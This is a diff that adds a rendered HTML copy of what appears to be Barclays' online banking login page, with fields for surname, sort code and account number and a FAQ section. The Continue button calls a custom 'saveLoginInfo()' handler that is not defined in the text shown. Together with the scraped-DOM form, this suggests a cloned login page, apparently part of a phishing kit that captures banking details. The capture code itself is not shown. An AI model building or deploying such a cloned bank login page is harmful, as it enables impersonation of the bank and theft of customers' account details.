+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                              <!-- ngIf: ((formController['surname'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['surname'].$invalid && formController['surname'].$dirty && !currentState && validationErrors)) && formController['surname'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['surname'].$error -->
+                                            </p>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    <div class="sortCodeInput">
+                                      <fieldset class="legendAlign multi-input-container form-item ng-scope ng-pristine ng-invalid ng-invalid-required ng-valid-i-n-p1 ng-valid-i-n-p2" id="sortCode" ng-class="{&#39;has-error&#39;:
+               (formController[&#39;sortCode&#39;].$invalid &amp;&amp; formController[&#39;sortCode&#39;].$dirty &amp;&amp; validationErrors)
+               || (formController.showErrorsIfAny &amp;&amp; formController[&#39;sortCode&#39;].$invalid)
+               }" separator="-" name="sortCode" format="XX-XX-XX" tooltipconfig="tooltipConfig(&#39;sortcode&#39;)" label="Sort code" ng-model="model.sortCode.value" model-arr="" input-config="configForSortCode" no-of-inputs="3" mca-validator="AppName.Module.sortCodeValidation | modelArr" validate-field="true" validation-errors="true" analytics-tag="" aria-required="true" analytics-label="SortCode" dss-dda-component="DDA Specific Component Attribute">
+                                        <legend class="label">
+                                          <span id="label-sortCode">Sort code</span>
+                                          <!-- ngIf: tooltipconfig -->
+                                          <span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;&lt;p&gt;Your sort code is a 6-digit number &amp;ndash; eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.&lt;/p&gt;&lt;p&gt;  &lt;img src=\&quot;/OLB/A/Content/Images/1321077850566-sortcode_account_number_card.jpg\&quot; alt=\&quot;Card\&quot; height=\&quot;113\&quot; width=\&quot;173\&quot; /&gt;&lt;/p&gt;&quot;,&quot;customAriaText&quot;:&quot;Your sort code is a 6-digit number � eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  &quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="tooltip-sortCode" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="button" aria-label="Your sort code is a 6-digit number � eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  " data-hasqtip="18"></span>
+                                          <!-- end ngIf: tooltipconfig -->
+                                        </legend>
+                                        <div ng-class="{&#39;row&#39;:inptConfig[1][&#39;cls&#39;].indexOf(&#39;col&#39;) !== -1}" class="row">
+                                          <!-- ngRepeat: i in arr track by $index -->
+                                          <div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 separator-hyphen first-input" ng-repeat="i in arr track by $index" ng-class="{&#39;separator-hyphen&#39;: separatorSymbol === &#39;-&#39; &amp;&amp; !$last,&#39;first-input&#39; : $first }">
+                                            <label for="sortCode-input-1" class="visuallyhidden ng-binding">sort code First 2 digits</label>
+                                            <!-- ngIf: separatorSymbol -->
+                                            <span ng-if="separatorSymbol" aria-hidden="true" class="hyphen ng-scope">-</span>
+                                            <!-- end ngIf: separatorSymbol -->
+                                            <span id="sortCode-1" class="sub-label ng-binding" aria-hidden="true"></span>
+                                            <input class="input ng-pristine ng-valid" maxlength="2" type="text" id="sortCode-input-1" aria-describedby="sortCode-1 additional-info-sortCode sortCode-error" ng-model="modelArr[$index]" ng-keyup="updateModelValue($event, $index)" ng-blur="blurHandler($event)" ng-change="changeHandler()" separator="-" format="XX-XX-XX" tooltipconfig="tooltipConfig(&#39;sortcode&#39;)" model-arr="" input-config="configForSortCode" no-of-inputs="3" validate-field="true" validation-errors="true" analytics-tag="" aria-required="true" analytics-label="SortCode">
+                                          </div>
+                                          <!-- end ngRepeat: i in arr track by $index -->
+                                          <div class="col-xs-4 col-sm-4 col-md-4 col-lg-4 separator-hyphen" ng-repeat="i in arr track by $index" ng-class="{&#39;separator-hyphen&#39;: separatorSymbol === &#39;-&#39; &amp;&amp; !$last,&#39;first-input&#39; : $first }">
+                                            <label for="sortCode-input-2" class="visuallyhidden ng-binding">sort code Second 2 digits</label>
+                                            <!-- ngIf: separatorSymbol -->
+                                            <span ng-if="separatorSymbol" aria-hidden="true" class="hyphen ng-scope">-</span>
+                                            <!-- end ngIf: separatorSymbol -->
+                                            <span id="sortCode-2" class="sub-label ng-binding" aria-hidden="true"></span>
+                                            <input class="input ng-pristine ng-valid" maxlength="2" type="text" id="sortCode-input-2" aria-describedby="sortCode-2 additional-info-sortCode sortCode-error" ng-model="modelArr[$index]" ng-keyup="updateModelValue($event, $index)" ng-blur="blurHandler($event)" ng-change="changeHandler()" separator="-" format="XX-XX-XX" tooltipconfig="tooltipConfig(&#39;sortcode&#39;)" model-arr="" input-config="configForSortCode" no-of-inputs="3" validate-field="true" validation-errors="true" analytics-tag="" aria-required="true" analytics-label="SortCode">
+                                          </div>
+                                          <!-- end ngRepeat: i in arr track by $index -->
+                                          <div class="col-xs-4 col-sm-4 col-md-4 col-lg-4" ng-repeat="i in arr track by $index" ng-class="{&#39;separator-hyphen&#39;: separatorSymbol === &#39;-&#39; &amp;&amp; !$last,&#39;first-input&#39; : $first }">
+                                            <label for="sortCode-input-3" class="visuallyhidden ng-binding">sort code Third 2 digits</label>
+                                            <!-- ngIf: separatorSymbol -->
+                                            <span ng-if="separatorSymbol" aria-hidden="true" class="hyphen ng-scope">-</span>
+                                            <!-- end ngIf: separatorSymbol -->
+                                            <span id="sortCode-3" class="sub-label ng-binding" aria-hidden="true"></span>
+                                            <input class="input ng-pristine ng-valid" maxlength="2" type="text" id="sortCode-input-3" aria-describedby="sortCode-3 additional-info-sortCode sortCode-error" ng-model="modelArr[$index]" ng-keyup="updateModelValue($event, $index)" ng-blur="blurHandler($event)" ng-change="changeHandler()" separator="-" format="XX-XX-XX" tooltipconfig="tooltipConfig(&#39;sortcode&#39;)" model-arr="" input-config="configForSortCode" no-of-inputs="3" validate-field="true" validation-errors="true" analytics-tag="" aria-required="true" analytics-label="SortCode">
+                                          </div>
+                                          <!-- end ngRepeat: i in arr track by $index -->
+                                        </div>
+                                        <div class="additional-info ng-hide" id="additional-info-sortCode" ng-show="inptConfig.additionalInfo" b-compile-html=""></div>
+                                        <div class="err-container" id="sortCode-error">
+                                          <div ng-show="(formController[&#39;sortCode&#39;].$invalid &amp;&amp; formController[&#39;sortCode&#39;].$dirty &amp;&amp; currentState &amp;&amp; validationErrors) ||
+        (formController.showErrorsIfAny &amp;&amp; formController[&#39;sortCode&#39;].$invalid &amp;&amp; currentState)" class="ng-hide">
+                                            <!-- ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                            <div ng-repeat="(key, value) in formController[&#39;sortCode&#39;].$error" class="ng-scope">
+                                              <p class="error-message ng-hide" ng-show="formController[&#39;sortCode&#39;].$error[key]" aria-live="assertive">
+                                                <span class="error-text">Error: </span>
+                                                <span class="ng-binding"></span>
+                                              </p>
+                                            </div>
+                                            <!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                            <div ng-repeat="(key, value) in formController[&#39;sortCode&#39;].$error" class="ng-scope">
+                                              <p class="error-message ng-hide" ng-show="formController[&#39;sortCode&#39;].$error[key]" aria-live="assertive">
+                                                <span class="error-text">Error: </span>
+                                                <span class="ng-binding"></span>
+                                              </p>
+                                            </div>
+                                            <!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                            <div ng-repeat="(key, value) in formController[&#39;sortCode&#39;].$error" class="ng-scope">
+                                              <p class="error-message" ng-show="formController[&#39;sortCode&#39;].$error[key]" aria-live="assertive">
+                                                <span class="error-text">Error: </span>
+                                                <span class="ng-binding"></span>
+                                              </p>
+                                            </div>
+                                            <!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                          </div>
+                                          <div ng-show="(formController[&#39;sortCode&#39;].$invalid &amp;&amp; formController[&#39;sortCode&#39;].$dirty &amp;&amp; !currentState &amp;&amp; validationErrors) ||
+      (formController.showErrorsIfAny &amp;&amp; formController[&#39;sortCode&#39;].$invalid &amp;&amp; !currentState)" class="ng-hide">
+                                            <!-- ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                            <div ng-repeat="(key, value) in formController[&#39;sortCode&#39;].$error" class="ng-scope">
+                                              <p class="error-message ng-hide" ng-show="formController[&#39;sortCode&#39;].$error[key]" aria-live="assertive">
+                                                <span class="error-text">Error: </span>
+                                                <span class="ng-binding">You must enter a valid sort code</span>
+                                              </p>
+                                            </div>
+                                            <!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                            <div ng-repeat="(key, value) in formController[&#39;sortCode&#39;].$error" class="ng-scope">
+                                              <p class="error-message ng-hide" ng-show="formController[&#39;sortCode&#39;].$error[key]" aria-live="assertive">
+                                                <span class="error-text">Error: </span>
+                                                <span class="ng-binding">Please check that you've entered the correct sort code and account number</span>
+                                              </p>
+                                            </div>
+                                            <!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                            <div ng-repeat="(key, value) in formController[&#39;sortCode&#39;].$error" class="ng-scope">
+                                              <p class="error-message" ng-show="formController[&#39;sortCode&#39;].$error[key]" aria-live="assertive">
+                                                <span class="error-text">Error: </span>
+                                                <span class="ng-binding">You must enter sort code</span>
+                                              </p>
+                                            </div>
+                                            <!-- end ngRepeat: (key, value) in formController['sortCode'].$error -->
+                                          </div>
+                                        </div>
+                                      </fieldset>
+                                    </div>
+                                    <div class="accNoInput">
+                                      <div class="ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2" dss-dda-component="DDA Specific Component Attribute">
+                                        <div class="form-item" ng-class="{&#39;has-error&#39;: (formController.showErrorsIfAny &amp;&amp; formController[&#39;accountNumber&#39;].$invalid) ||
+       (formController[&#39;accountNumber&#39;].$invalid &amp;&amp; formController[&#39;accountNumber&#39;].$dirty &amp;&amp; validationErrors)}">
+                                          <label class="label">
+                                            <span for="accountNumber" id="label-accountNumber">Account number</span>
+                                            <label for="accountNumber" id="extraLabelData-accountNumber" class="visuallyhidden ng-binding" aria-hidden="true"></label>
+                                            <!-- ngIf: tooltipconfig -->
+                                            <span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;&lt;p&gt;Your sort code is a 6-digit number &amp;ndash; eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.&lt;/p&gt;&lt;p&gt;  &lt;img src=\&quot;/OLB/A/Content/Images/1321077850566-sortcode_account_number_card.jpg\&quot; alt=\&quot;Card\&quot; height=\&quot;113\&quot; width=\&quot;173\&quot; /&gt;&lt;/p&gt;&quot;,&quot;customAriaText&quot;:&quot;Your sort code is a 6-digit number � eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  &quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="described-accountNumber" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="button" aria-label="Your sort code is a 6-digit number � eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  " data-hasqtip="19"></span>
+                                            <!-- end ngIf: tooltipconfig -->
+                                          </label>
+                                          <div class="input-wrapper" ng-class="{&#39;image-at-right&#39;: showImg}">
+                                            <span class="input-prefix"></span>
+                                            <span class="input-suffix"></span>
+                                            <input ng-attr-tabindex="" aria-labelledby="label-accountNumber extraLabelData-accountNumber" aria-describedby="described-accountNumber  input-err-1hhanvdqg" class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2" id="accountNumber" name="accountNumber" ng-model="model.accountNumber.value" type="text" maxlength="8" mca-validator-extended="AppName.Module.accountNumberValidation | this.formController.accountNumber" validator-event="blur" supportglobalerror="true" tooltipconfig="tooltipConfig(&#39;sortcode&#39;)" aria-required="true" analytics-tag="" aria-invalid="false">
+                                            <!-- ngIf: showImg -->
+                                          </div>
+                                          <div id="input-err-1hhanvdqg" aria-hidden="true">
+                                            <p class="no-margin" aria-live="assertive">
+                                              <!-- ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngIf: ((formController['accountNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && currentState && validationErrors)) && formController['accountNumber'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngIf: ((formController['accountNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && currentState && validationErrors)) && formController['accountNumber'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngIf: ((formController['accountNumber'].$invalid && currentState && formController.showErrorsIfAny) ||
+            (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && currentState && validationErrors)) && formController['accountNumber'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngIf: ((formController['accountNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && !currentState && validationErrors)) && formController['accountNumber'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngIf: ((formController['accountNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && !currentState && validationErrors)) && formController['accountNumber'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                              <!-- ngIf: ((formController['accountNumber'].$invalid && !currentState && formController.showErrorsIfAny) ||
+        (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && !currentState && validationErrors)) && formController['accountNumber'].$error[key] -->
+                                              <!-- end ngRepeat: (key, value) in formController['accountNumber'].$error -->
+                                            </p>
+                                          </div>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </ng-form>
+                                </ng-include>
+                              </div>
+                            </div>
+                            <div class="checkboxWidth">
+                              <b-check id="checkbox1" name="confirmation" ng-model="model.rememberToken" data="rememberMeCheck" arrange="controls-stacked" value-field="value" display-field="display" aria-label="rememberWarning" use-label="rememberWarning" aria-describedby="rememberWarning" analytics-tag="" class="ng-isolate-scope ng-pristine ng-valid" dss-dda-component="DDA Specific Component Attribute">
+                                <div class="form-item checkbox-element controls-stacked" ng-class="{&#39;has-error&#39;:(formController[name].$invalid &amp;&amp; formController[name].$dirty) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid)}" id="b-checkbox-checkbox1">
+                                  <!-- ngIf: label -->
+                                  <fieldset>
+                                    <!-- ngIf: label -->
+                                    <!-- ngRepeat: (key,item) in scopeData -->
+                                    <label class="control control-checkbox ng-scope last-child first-child" ng-class="{&#39;last-child&#39;:$last, &#39;first-child&#39;:$first}" ng-repeat="(key,item) in scopeData">
+                                      <div class="click-event-container">
+                                        <input type="checkbox" name="confirmation" value="Y" id="checkbox1_Y" class=" control-input" ng-disabled="ngDisabled" aria-required="false" aria-describedby="b-checkbox-additional-checkbox1-0 rememberWarning  checkbox-err-1hhanvdpo" tabindex="" ng-checked="isChecked(item[valueField])" ng-click="checkBoxClick($event)">
+                                        <span id="b-checkbox-span-checkbox1-0" class="control-indicator" aria-hidden="true">
+                                          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14.01 10" class="icon-tick">
+                                            <title>Tick</title>
+                                            <path d="M5.45,8.81.82,5.11a.5.5,0,1,0-.64.76l0,0,5,4a.51.51,0,0,0,.69-.06l8-9a.5.5,0,0,0,0-.7h0a.5.5,0,0,0-.7,0h0Z"></path>
+                                          </svg>
+                                        </span>
+                                        <span class="control-description">
+                                          <span id="b-checkbox-checkbox1-0" class="ng-binding">Remember my last name and login method (optional)</span>
+                                          <span id="b-checkbox-additional-checkbox1-0">
+                                            <!-- ngIf: item.htmlContent -->
+                                            <!-- ngIf: !item.htmlContent -->
+                                            <span ng-if="!item.htmlContent" class="additional-text ng-binding ng-scope"></span>
+                                            <!-- end ngIf: !item.htmlContent -->
+                                          </span>
+                                        </span>
+                                      </div>
+                                    </label>
+                                    <!-- end ngRepeat: (key,item) in scopeData -->
+                                  </fieldset>
+                                  <div id="checkbox-err-1hhanvdpo">
+                                    <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; currentState) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; currentState)" class="ng-hide">
+                                      <!-- ngRepeat: (key, value) in formController[name].$error -->
+                                    </div>
+                                    <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; !currentState) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; !currentState)" class="ng-hide">
+                                      <!-- ngRepeat: (key, value) in formController[name].$error -->
+                                    </div>
+                                  </div>
+                                  <!--
+    <div id="{{errId}}"><p class="no-margin" aria-live="assertive"><span class="error-message error-text" ng-repeat="(key, value) in formController[name].$error"
+                  ng-show="((formController[name].$invalid && formController[name].$dirty && currentState) || (formController.showErrorsIfAny && formController[name].$invalid && currentState)) && formController[name].$error[key]">Error: {{errors[currentState][name][key]}}</span><span class="error-message error-text" ng-repeat="(key, value) in formController[name].$error"
+                  ng-show="((formController[name].$invalid && formController[name].$dirty && !currentState) || (formController.showErrorsIfAny && formController[name].$invalid && !currentState)) && formController[name].$error[key]">Error: {{errors[name][key]}}</span></p></div>
+    -->
+                                </div>
+                              </b-check>
+                              <b-text id="rememberWarning" type="span" class="check-info font-family ng-isolate-scope" b-data="Don&#39;t tick the box if you&#39;re using a public or shared device" dss-dda-component="DDA Specific Component Attribute">
+                                <span>Don't tick the box if you're using a public or shared device</span>
+                              </b-text>
+                            </div>
+                          </div>
+                          <!-- end ngIf: !mobileView -->
+                          <!-- ngIf: mobileView -->
+                          <div class="seperator"></div>
+                          <div class="marginUpDown">
+                            <button onclick="saveLoginInfo()" id="continue" role="button" aria-expanded="false" class="btn rolbBtn btn btn-primary marginDownMobile" value="Continue" analytics-tag="" dss-dda-component="DDA Specific Component Attribute"> Continue </button>
+                          </div>
+                        </div>
+                        <!-- end ngIf: browser.valid -->
+                      </form>
+                    </div>
+                  </div>
+                </div>
+              </section>
+            </main>
+            <!-- ngIf: faqContent.eligible -->
+            <faq ng-if="faqContent.eligible" faq-content="faqContent" class="ng-scope ng-isolate-scope">
+              <aside class="faqBackground">
+                <div class="container-fluid">
+                  <div class="row">
+                    <div class="col-sm-12 col-lg-12">
+                      <div class="col-md-8 col-md-offset-2 px-0">
+                        <div class="spaceFAQ">
+                          <b-text class="head-color mt-30 ng-isolate-scope" type="h2" b-data="Frequently asked questions" dss-dda-component="DDA Specific Component Attribute">
+                            <h2>Frequently asked questions</h2>
+                          </b-text>
+                        </div>
+                        <div>
+                          <b-accordion name="accordion" data="templates" dss-dda-component="DDA Specific Component Attribute">
+                            <ul class="accordion js-accordion accordion-hasjs">
+                              <!-- ngRepeat: (key, value) in templates -->
+                              <li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+                                <span class="accordion-heading">
+                                  <a class="accordion-heading-link" role="button" href="https://bank.barclays.co.uk/olb/authlogin/loginAppContainer.do#heading_0_1hhangils" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+                                    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+                                      <g id="Symbols_0_1hhangils" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+                                        <g id="Account-summary---closed_0_1hhangils" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+                                          <g id="Group-6_0_1hhangils" transform="translate(265.000000, 154.000000)">
+                                            <g id="Group-10_0_1hhangils" transform="translate(0.000000, 100.000000)">
+                                              <g id="Group-8_0_1hhangils">
+                                                <g id="Group-12_0_1hhangils">
+                                                  <g id="Group-13_0_1hhangils">
+                                                    <g id="Group-7_0_1hhangils" transform="translate(30.000000, 14.000000)">
+                                                      <g id="Group-3-Copy_0_1hhangils" transform="translate(0.000000, 2.000000)">
+                                                        <g id="icons-/-arrow-/-Arrow_18px_blue_0_1hhangils" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                                                          <polyline id="Arrow_18px_blue_0_1hhangils" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                                                        </g>
+                                                      </g>
+                                                    </g>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </g>
+                                          </g>
+                                        </g>
+                                      </g>
+                                    </svg>
+                                    <span class="ng-binding">Service status</span>
+                                  </a>
+                                </span>
+                                <div class="accordion-content-wrapper accordion-content-closed" id="heading_0_1hhangils" aria-hidden="true">
+                                  <div class="accordion-content">
+                                    <!-- ngIf: !value.noTemplate -->
+                                    <!-- ngIf: value.noTemplate -->
+                                    <div ng-if="value.noTemplate" class="ng-scope">
+                                      <div b-compile-html="&lt;ul&gt;&lt;li&gt;To check how our services are running and see our planned maintenance, head to &lt;a href=&quot;https://status.uk.barclays/&quot;&gt;status.uk.barclays&lt;/a&gt; or type &amp;lsquo;status.barclays&amp;rsquo; into your browser.&lt;/li&gt;&lt;/ul&gt;">
+                                        <ul class="ng-scope">
+                                          <li>To check how our services are running and see our planned maintenance, head to <a href="https://status.uk.barclays/">status.uk.barclays</a> or type �status.barclays� into your browser. </li>
+                                        </ul>
+                                      </div>
+                                    </div>
+                                    <!-- end ngIf: value.noTemplate -->
+                                  </div>
+                                </div>
+                              </li>
+                              <!-- end ngRepeat: (key, value) in templates -->
+                              <li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+                                <span class="accordion-heading">
+                                  <a class="accordion-heading-link" role="button" href="https://bank.barclays.co.uk/olb/authlogin/loginAppContainer.do#heading_1_1hhangils" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+                                    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+                                      <g id="Symbols_1_1hhangils" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+                                        <g id="Account-summary---closed_1_1hhangils" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+                                          <g id="Group-6_1_1hhangils" transform="translate(265.000000, 154.000000)">
+                                            <g id="Group-10_1_1hhangils" transform="translate(0.000000, 100.000000)">
+                                              <g id="Group-8_1_1hhangils">
+                                                <g id="Group-12_1_1hhangils">
+                                                  <g id="Group-13_1_1hhangils">
+                                                    <g id="Group-7_1_1hhangils" transform="translate(30.000000, 14.000000)">
+                                                      <g id="Group-3-Copy_1_1hhangils" transform="translate(0.000000, 2.000000)">
+                                                        <g id="icons-/-arrow-/-Arrow_18px_blue_1_1hhangils" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                                                          <polyline id="Arrow_18px_blue_1_1hhangils" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                                                        </g>
+                                                      </g>
+                                                    </g>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </g>
+                                          </g>
+                                        </g>
+                                      </g>
+                                    </svg>
+                                    <span class="ng-binding">Is saving my details safe?</span>
+                                  </a>
+                                </span>
+                                <div class="accordion-content-wrapper accordion-content-closed" id="heading_1_1hhangils" aria-hidden="true">
+                                  <div class="accordion-content">
+                                    <!-- ngIf: !value.noTemplate -->
+                                    <!-- ngIf: value.noTemplate -->
+                                    <div ng-if="value.noTemplate" class="ng-scope">
+                                      <div b-compile-html="&lt;ul class=&quot;help-content-drawer&quot;&gt;    &lt;li&gt;    &lt;p&gt;If you tick the &#39;remember me&#39; box, your details will only be retained on the device you&#39;re using at the time. That&#39;s why we don&#39;t recommend you do so on any public or shared devices. This means you don&#39;t need to worry about anyone else seeing the details. Even if they do, there isn&#39;t enough information there for anyone to access your accounts in Online Banking or any other way.&lt;/p&gt;    &lt;p&gt;If you want to save your details, you need to make sure you&#39;ve switched cookies on for your browser &amp;ndash; that&#39;s how the information is stored.&lt;/p&gt;    &lt;/li&gt;&lt;/ul&gt;">
+                                        <ul class="help-content-drawer ng-scope">
+                                          <li>
+                                            <p>If you tick the 'remember me' box, your details will only be retained on the device you're using at the time. That's why we don't recommend you do so on any public or shared devices. This means you don't need to worry about anyone else seeing the details. Even if they do, there isn't enough information there for anyone to access your accounts in Online Banking or any other way.</p>
+                                            <p>If you want to save your details, you need to make sure you've switched cookies on for your browser � that's how the information is stored.</p>
+                                          </li>
+                                        </ul>
+                                      </div>
+                                    </div>
+                                    <!-- end ngIf: value.noTemplate -->
+                                  </div>
+                                </div>
+                              </li>
+                              <!-- end ngRepeat: (key, value) in templates -->
+                              <li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+                                <span class="accordion-heading">
+                                  <a class="accordion-heading-link" role="button" href="https://bank.barclays.co.uk/olb/authlogin/loginAppContainer.do#heading_2_1hhangils" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+                                    <svg aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+                                      <g id="Symbols_2_1hhangils" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+                                        <g id="Account-summary---closed_2_1hhangils" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+                                          <g id="Group-6_2_1hhangils" transform="translate(265.000000, 154.000000)">
+                                            <g id="Group-10_2_1hhangils" transform="translate(0.000000, 100.000000)">
+                                              <g id="Group-8_2_1hhangils">
+                                                <g id="Group-12_2_1hhangils">
+                                                  <g id="Group-13_2_1hhangils">
+                                                    <g id="Group-7_2_1hhangils" transform="translate(30.000000, 14.000000)">
+                                                      <g id="Group-3-Copy_2_1hhangils" transform="translate(0.000000, 2.000000)">
+                                                        <g id="icons-/-arrow-/-Arrow_18px_blue_2_1hhangils" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                                                          <polyline id="Arrow_18px_blue_2_1hhangils" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                                                        </g>
+                                                      </g>
+                                                    </g>
+                                                  </g>
+                                                </g>
+                                              </g>
+                                            </g>
+                                          </g>
+                                        </g>
+                                      </g>
+                                    </svg>
+                                    <span class="ng-binding">What does error code 6 mean?</span>
+                                  </a>
+                                </span>
+                                <div class="accordion-content-wrapper accordion-content-closed" id="heading_2_1hhangils" aria-hidden="true">
+                                  <div class="accordion-content">
+                                    <!-- ngIf: !value.noTemplate -->
+                                    <!-- ngIf: value.noTemplate -->
+                                    <div ng-if="value.noTemplate" class="ng-scope">
+                                      <div b-compile-html="&lt;ul class=&quot;help-content-drawer&quot;&gt;
+&lt;li&gt;&lt;p style=&quot;text-align: left;&quot;&gt;If you&#39;re having problems logging in to Online Banking, you may need to clear your internet browser&#39;s cache or update the browser.&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;Below is a guide to clearing the cache for the most common browsers. You can also find the information in your browser&#39;s &#39;help&#39; section.&lt;/p&gt;
+&lt;br&gt;
+&lt;h3 align=&quot;left&quot;&gt;&lt;b&gt;PC users:&lt;/b&gt;&lt;/h3&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Internet Explorer (IE)&lt;/b&gt; &amp;ndash; press &lt;b&gt;Ctrl, Shift&lt;/b&gt; and &lt;b&gt;Delete&lt;/b&gt; together, then select &#39;temporary internet files&#39; and click &#39;delete&#39;&lt;/p&gt;
+&lt;p style=&quot;text-align: left;&quot;&gt;&lt;b&gt;Chrome&lt;/b&gt; &amp;ndash; press &lt;b&gt;Ctrl, Shift&lt;/b&gt; and &lt;b&gt;Delete&lt;/b&gt; together. In the &#39;clear browsing data window&#39;, select &#39;cached images and files&#39; only, then click &#39;clear browsing data&#39;&lt;/p&gt;
